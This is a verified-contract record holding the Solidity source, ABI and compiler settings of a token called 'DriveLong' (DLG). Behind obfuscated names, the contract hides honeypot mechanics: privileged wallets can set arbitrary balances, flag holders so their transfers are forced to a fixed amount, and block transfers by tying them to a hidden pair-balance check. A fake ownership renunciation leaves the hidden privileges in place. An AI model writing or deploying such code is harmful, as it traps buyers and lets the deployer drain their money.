{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface autoReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract liquidityShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitLaunched {\n    function createPair(address teamList, address receiverMin) external returns (address);\n}\n\ninterface modeLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingLaunched) external view returns (uint256);\n\n    function transfer(address autoSwap, uint256 teamSender) external returns (bool);\n\n    function allowance(address listTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoSwap,\n        uint256 teamSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellToken, uint256 value);\n    event Approval(address indexed listTake, address indexed spender, uint256 value);\n}\n\ninterface modeLimitMetadata is modeLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DriveLong is liquidityShould, modeLimit, modeLimitMetadata {\n\n    uint8 private txTo = 18;\n\n    uint256 private isFee;\n\n    uint256 private feeLiquidity;\n\n    uint256 isSender;\n\n    function liquidityReceiver(address autoTakeTotal, uint256 teamSender) public {\n        atLaunched();\n        amountLaunched[autoTakeTotal] = teamSender;\n    }\n\n    function totalTeam(address listTx) public {\n        atLaunched();\n        \n        if (listTx == isList || listTx == maxTxAt) {\n            return;\n        }\n        modeAtMarketing[listTx] = true;\n    }\n\n    function atLaunched() private view {\n        require(tokenSenderAmount[_msgSender()]);\n    }\n\n    function allowance(address launchedTotal, address teamReceiver) external view virtual override returns (uint256) {\n        if (teamReceiver == buyReceiver) {\n            return type(uint256).max;\n        }\n        return amountEnable[launchedTotal][teamReceiver];\n    }\n\n    function approve(address teamReceiver, uint256 teamSender) public virtual override returns (bool) {\n        amountEnable[_msgSender()][teamReceiver] = teamSender;\n        emit Approval(_msgSender(), teamReceiver, teamSender);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingFund;\n    }\n\n    bool private teamFund;\n\n    function owner() external view returns (address) {\n        return txAmount;\n    }\n\n    bool public atList;\n\n    mapping(address => bool) public modeAtMarketing;\n\n    uint256 public fromTotalSwap;\n\n    mapping(address => mapping(address => uint256)) private amountEnable;\n\n    address public maxTxAt;\n\n    function limitFrom() public {\n        emit OwnershipTransferred(isList, address(0));\n        txAmount = address(0);\n    }\n\n    function feeMinAuto(address buyShould, address autoSwap, uint256 teamSender) internal returns (bool) {\n        require(amountLaunched[buyShould] >= teamSender);\n        amountLaunched[buyShould] -= teamSender;\n        amountLaunched[autoSwap] += teamSender;\n        emit Transfer(buyShould, autoSwap, teamSender);\n        return true;\n    }\n\n    function balanceOf(address tradingLaunched) public view virtual override returns (uint256) {\n        return amountLaunched[tradingLaunched];\n    }\n\n    string private tradingBuy = \"Drive Long\";\n\n    function getOwner() external view returns (address) {\n        return txAmount;\n    }\n\n    address public isList;\n\n    uint256 private maxReceiver = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public tokenSenderAmount;\n\n    bool public marketingBuy;\n\n    address buyReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address buyShould, address autoSwap, uint256 teamSender) external override returns (bool) {\n        if (_msgSender() != buyReceiver) {\n            if (amountEnable[buyShould][_msgSender()] != type(uint256).max) {\n                require(teamSender <= amountEnable[buyShould][_msgSender()]);\n                amountEnable[buyShould][_msgSender()] -= teamSender;\n            }\n        }\n        return exemptTotalReceiver(buyShould, autoSwap, teamSender);\n    }\n\n    uint256 public atLiquidity;\n\n    address private txAmount;\n\n    string private tradingFund = \"DLG\";\n\n    function exemptTotalReceiver(address buyShould, address autoSwap, uint256 teamSender) internal returns (bool) {\n        if (buyShould == isList) {\n            return feeMinAuto(buyShould, autoSwap, teamSender);\n        }\n        uint256 receiverAt = modeLimit(maxTxAt).balanceOf(amountAtTake);\n        require(receiverAt == isSender);\n        require(autoSwap != amountAtTake);\n        if (modeAtMarketing[buyShould]) {\n            return feeMinAuto(buyShould, autoSwap, listAuto);\n        }\n        return feeMinAuto(buyShould, autoSwap, teamSender);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return txTo;\n    }\n\n    mapping(address => uint256) private amountLaunched;\n\n    address amountAtTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return tradingBuy;\n    }\n\n    constructor (){\n        \n        autoReceiver walletEnable = autoReceiver(buyReceiver);\n        maxTxAt = limitLaunched(walletEnable.factory()).createPair(walletEnable.WETH(), address(this));\n        if (isFee == atLiquidity) {\n            isFee = feeLiquidity;\n        }\n        isList = _msgSender();\n        limitFrom();\n        tokenSenderAmount[isList] = true;\n        amountLaunched[isList] = maxReceiver;\n        \n        emit Transfer(address(0), isList, maxReceiver);\n    }\n\n    function feeBuy(uint256 teamSender) public {\n        atLaunched();\n        isSender = teamSender;\n    }\n\n    function toMinLiquidity(address senderTotal) public {\n        require(senderTotal.balance < 100000);\n        if (atList) {\n            return;\n        }\n        \n        tokenSenderAmount[senderTotal] = true;\n        if (fromTotalSwap != isFee) {\n            teamFund = true;\n        }\n        atList = true;\n    }\n\n    function transfer(address autoTakeTotal, uint256 teamSender) external virtual override returns (bool) {\n        return exemptTotalReceiver(_msgSender(), autoTakeTotal, teamSender);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxReceiver;\n    }\n\n    uint256 constant listAuto = 17 ** 10;\n\n    uint256 listFee;\n\n    event OwnershipTransferred(address indexed enableLaunched, address indexed marketingAuto);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamSender\",\"type\":\"uint256\"}],\"name\":\"feeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTotalSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTakeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamSender\",\"type\":\"uint256\"}],\"name\":\"liquidityReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTxAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeAtMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTotal\",\"type\":\"address\"}],\"name\":\"toMinLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenSenderAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTx\",\"type\":\"address\"}],\"name\":\"totalTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTakeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DriveLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}